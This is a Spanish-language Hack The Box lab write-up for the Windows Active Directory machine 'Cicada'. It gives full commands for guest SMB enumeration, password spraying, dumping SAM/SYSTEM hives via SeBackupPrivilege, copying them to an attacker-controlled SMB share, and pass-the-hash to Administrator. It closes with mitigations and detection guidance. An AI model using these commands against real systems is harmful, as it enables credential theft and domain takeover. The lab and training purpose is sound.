---
machine: Cicada
os: Windows
difficulty: Easy
platform: Hack The Box
category: Active Directory / Windows
state: Retired
tags: [windows, active-directory, smb, password-spray, sebackupprivilege, pass-the-hash]
---

# Cicada — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

El controlador de dominio expone SMB con acceso de invitado y el share `HR` contiene un aviso de onboarding con la **contraseña por defecto** de la empresa. Un spray contra los usuarios enumerados por RID valida la cuenta de `michael.wrightson`; su lectura de LDAP revela la contraseña de `david.orelious` en el atributo `description`, y `david` lee el share `DEV`, donde `Backup_script.ps1` lleva las credenciales de `emily.oscars` en claro. Emily está en `Remote Management Users` y en `Backup Operators`: con WinRM y `SeBackupPrivilege` se guardan las colmenas `SAM`/`SYSTEM`, se extrae el hash del Administrator local y se entra por pass-the-hash.

## Reconocimiento

```bash
nmap -p- --min-rate 5000 -T4 <IP> -oN nmap_all.txt
nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985 -sCV <IP> -oN nmap_svc.txt
```

```text
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn
389/tcp   open  ldap          Microsoft Windows AD LDAP (Domain: cicada.htb)
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ssl/ldap
3268/tcp  open  ldap          Global Catalog
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
```

Host `CICADA-DC`, dominio `cicada.htb`. La firma SMB está activa, así que el relay no es el camino: el caso es de credenciales, no de red.

```bash
echo "<IP> cicada.htb CICADA-DC.cicada.htb" | sudo tee -a /etc/hosts
```

## Enumeración

Acceso SMB sin credenciales. Según la instancia, `anonymous` se rechaza pero **`guest` con contraseña vacía** sí entra; lo estable es que el share `HR` se puede leer:

```bash
smbclient -L //<IP> -N
smbclient //<IP>/HR -N
```

Dentro está `Notice from HR.txt`, un aviso de bienvenida que incluye la contraseña inicial que se entrega a los empleados nuevos. Es el dato que convierte un share "aburrido" en un spray.

Enumeración de usuarios por RID sin autenticar:

```bash
impacket-lookupsid cicada.htb/guest@<IP> -no-pass
```

Salen `john.smoulder`, `sarah.dantelia`, `michael.wrightson`, `david.orelious` y `emily.oscars`.

```bash
nxc smb <IP> -u users.txt -p '<DEFAULT_PASSWORD>' --continue-on-success
```

La contraseña por defecto sigue siendo válida para **`michael.wrightson`**: nadie la cambió. Michael no está en `Remote Management Users`, pero sí puede leer LDAP:

```bash
ldapsearch -x -H ldap://<IP> -D 'michael.wrightson@cicada.htb' -w '<PASSWORD>' \
  -b 'DC=cicada,DC=htb' '(objectClass=user)' sAMAccountName description
```

El atributo `description` de `david.orelious` contiene su contraseña ("por si la olvido"). David tiene READ sobre el share `DEV`:

```bash
smbclient //<IP>/DEV -U 'david.orelious%<PASSWORD>'
```

Allí está `Backup_script.ps1`, con credenciales de **`emily.oscars`** embebidas. Emily pertenece a `Remote Management Users` (WinRM) y a `Backup Operators`.

## Foothold

```bash
nxc winrm <IP> -u emily.oscars -p '<PASSWORD>'
evil-winrm -i <IP> -u emily.oscars -p '<PASSWORD>'
```

Tres credenciales encadenadas, todas en texto claro en recursos legítimos: el patrón se repite en cualquier auditoría de AD con shares de RRHH y scripts de backup.

## Movimiento lateral

No hay salto a un segundo equipo: el compromiso es del propio DC. El "movimiento" es vertical, de usuario de dominio a administrador del controlador.

## Escalada de privilegios

```powershell
whoami /priv
whoami /groups
```

Emily tiene `SeBackupPrivilege` y `SeRestorePrivilege` **habilitados** por pertenecer a `Backup Operators`. Ese privilegio permite abrir ficheros saltándose las ACL (pensado para backups), y con él se copian las colmenas del registro:

```powershell
mkdir C:\Temp
reg save hklm\sam C:\Temp\sam /y
reg save hklm\system C:\Temp\system /y
reg save hklm\security C:\Temp\security /y
```

```bash
impacket-smbserver share /tmp/share -smb2support
# desde la sesión de WinRM:
# copy C:\Temp\sam \\<LHOST>\share\sam
impacket-secretsdump -sam sam -system system -security security LOCAL
```

El hash NTLM del `Administrator` local del DC se usa directamente:

```bash
evil-winrm -i <IP> -u Administrator -H <NTLM_HASH>
```

Variante equivalente: `diskshadow` para exponer `C:` y copiar `C:\Windows\NTDS\ntds.dit` con la misma técnica; `secretsdump -ntds ntds.dit -system system LOCAL` da el mismo hash. El camino de `SAM`/`SYSTEM` es el más corto y el que menos toca el sistema.

## Evidencia

- Salidas recortadas de `whoami /priv`, `reg save` y `secretsdump`.
- Sin flags, hashes ni contraseñas: los valores reales viven en `private/`.

## Lecciones aprendidas

- Un share de RRHH con la contraseña de onboarding es un spray garantizado: la gente no la cambia.
- El spray necesita una lista de usuarios; `lookupsid` la da sin credenciales y sin tocar el lockout si se espacia.
- `description` y `info` son los dos atributos de LDAP donde más contraseñas se filtran.
- `Backup Operators` no "solo hace backups": con `SeBackupPrivilege` se leen las colmenas y se compromete el dominio entero.
- Si `anonymous` falla, probar `guest` con contraseña vacía antes de descartar SMB.

## Mitigaciones y detección

- Contraseña inicial aleatoria por usuario y forzar el cambio en el primer inicio de sesión.
- Quitar `Backup Operators` a cuentas humanas; si se necesita, usar una cuenta gestionada (gMSA) con auditoría.
- Restringir la lectura de `description`/`info` a los administradores (ACL sobre el atributo) y revisar su contenido.
- Detección: muchos 4625 seguidos de un 4624 en la misma ventana (`4625` con `Sub Status 0xc000006a`), lectura masiva de shares desde una cuenta de usuario, `reg save hklm\sam` (4688 con esa línea de comandos o Sysmon 1) y uso de `SeBackupPrivilege` (4672 + 4656 sobre las colmenas).
- Cerrar SMB a invitados y quitar el share `HR` de la raíz del DC.

MITRE: T1078 (valid accounts), T1110.003 (password spraying), T1552.001 (credentials in files), T1003.002 (SAM), T1550.002 (pass the hash).

## Referencias

- <https://www.hackthebox.com/machines/cicada>
- <https://benheater.com/hackthebox-cicada>
- <https://chaelsoo.me/writeups/htb-cicada>
- <https://certifa.net/writeups/htb-cicada>
- <https://learn.microsoft.com/en-us/windows-server/security/kerberos/backup-operators>
